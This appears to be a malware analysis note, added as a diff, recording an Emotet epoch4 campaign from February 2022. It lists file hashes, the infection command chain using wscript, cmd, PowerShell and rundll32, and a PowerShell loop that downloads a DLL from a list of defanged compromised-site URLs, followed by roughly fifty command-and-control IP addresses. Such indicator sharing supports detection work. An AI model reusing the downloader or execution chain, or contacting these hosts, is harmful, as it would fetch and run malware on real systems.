@@ -1,0 +1,96 @@
+Emotet 2022 - 03.02.2022 - epoch4
+
+************************************************************************************************************
+
+.xls 81bdf1ecf3b3db164fc52bbc64118e57f7cb02db7ada35c94fa5a85602d08c08
+
+.dll b9aecb6b70604f95c578ba56cc25f3d19c93aad7dfdb248595395a79c7ae64e9
+
+wscript c:\programdata\sduoixo.vbs
+
+cmd.exe /c C:\programdata\jledshf.bat
+
+powershell  -enc [Base64 blob]
+
+cmd.exe /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\vbkwk.dll,dfsgeresd
+
+rundll32.exe c:\programdata\vbkwk.dll,DllRegisterServer
+
+.ps1
+
+$jeolise3rhgdzs4cdfg = "hxxp://goyaluat.vmesh.in/0v6kcny/CG/", "hxxps://mars.srl/wp-admin/7Ffk6LLN2Xs2W/", "hxxp://franmulero.es/mbx/8c5RBJx6/", "hxxp://varafood.com/Ajax/cnM91G/", "hxxps://7jcat.com/wp-content/t/", "hxxp://blog.centralhome.hu/wp-content/pB1RfPCnBlS1WfpcOL/", "hxxp://zimrights.co.zw/oldsite/k0EoCWycU9tNo1d/", "hxxps://mudhands.com/error/BfH/", "hxxp://albatrospatagonia.com/phkcvt/t53ceSMDqgPQlq/", "hxxp://mapcommunications.co.zw/wp-admin/mdRRbSdU3aB7Xpx6z/", "hxxp://odconsult.co.uk/ALFA_DATA/HHr0FqOXAn62/", "hxxp://dushkin.net/img/bhQSTNicEMtNQxP/"
+foreach ($jdtfjdxhr6txyhd in $jeolise3rhgdzs4cdfg) {
+  $rhykajdhfs7idfgd = "c:\\programdata\\vbkwk.dll"
+  invoke-webrequest -uri $jdtfjdxhr6txyhd -outfile $rhykajdhfs7idfgd
+  if (test-path "c:\\programdata\\vbkwk.dll") {
+    if ((get-item "c:\\programdata\\vbkwk.dll").length -ge 45000) {
+      break
+    }
+  }
+}
+
+.dll distro
+
+hxxp://goyaluat.vmesh.in/0v6kcny/CG/
+hxxps://mars.srl/wp-admin/7Ffk6LLN2Xs2W/
+hxxp://franmulero.es/mbx/8c5RBJx6/
+hxxp://varafood.com/Ajax/cnM91G/
+hxxps://7jcat.com/wp-content/t/
+hxxp://blog.centralhome.hu/wp-content/pB1RfPCnBlS1WfpcOL/
+hxxp://zimrights.co.zw/oldsite/k0EoCWycU9tNo1d/
+hxxps://mudhands.com/error/BfH/
+hxxp://albatrospatagonia.com/phkcvt/t53ceSMDqgPQlq/
+hxxp://mapcommunications.co.zw/wp-admin/mdRRbSdU3aB7Xpx6z/
+hxxp://odconsult.co.uk/ALFA_DATA/HHr0FqOXAn62/
+hxxp://dushkin.net/img/bhQSTNicEMtNQxP/
+
+c2's
+
+192.254.71.210:443
+23.246.204.126:443
+164.68.99.3:8080
+144.76.186.49:8080
+192.95.56.148:8080
+79.172.212.216:8080
+162.214.50.39:7080
+81.0.236.90:443
+159.89.230.105:443
+45.176.232.124:443
+212.24.98.99:8080
+185.157.82.211:8080
+159.8.59.82:8080
+45.118.135.203:7080
+51.254.140.238:7080
+144.76.186.55:7080
+46.55.222.11:443
+212.237.56.116:7080
+58.227.42.236:80
+162.243.175.63:443
+200.17.134.35:7080
+216.158.226.206:443
+173.212.193.249:8080
+103.75.201.4:443
+207.38.84.195:8080
+45.118.115.99:8080
+82.165.152.127:8080
+178.128.83.165:80
+110.232.117.186:8080
+50.116.54.215:443
+103.75.201.2:443
+212.237.5.209:443
+119.235.255.201:8080
+129.232.188.93:443
+160.16.102.168:80
+176.104.106.96:8080
+131.100.24.231:80
+158.69.222.101:443
+104.251.214.46:8080
+45.142.114.231:8080
+217.182.143.207:443
+41.76.108.46:8080
+212.237.17.99:8080
+107.182.225.142:8080
+203.114.109.124:443
+138.185.72.26:8080
+178.79.147.66:8080
+195.154.133.20:443
